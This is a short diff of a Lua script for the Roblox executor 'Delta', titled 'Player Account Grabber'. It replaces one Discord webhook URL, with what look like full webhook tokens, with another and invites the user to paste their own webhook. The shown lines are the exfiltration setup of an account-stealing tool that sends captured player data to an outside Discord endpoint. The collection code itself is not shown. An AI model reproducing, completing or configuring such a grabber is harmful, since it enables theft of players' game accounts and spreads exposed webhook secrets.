@@ -1,7 +1,7 @@
 --// Delta Executor - Player Account Grabber
 --// Paste your Discord webhook below
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1519322724281876511/w8U8K-U7TwG79mY5NFgFaJfumRWiYUHwQFEo2ZRlgOMyJWtVvDcMreCbBnIqOKNivRuh"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"
 
 --// Services
 local HttpService = game:GetService("HttpService")
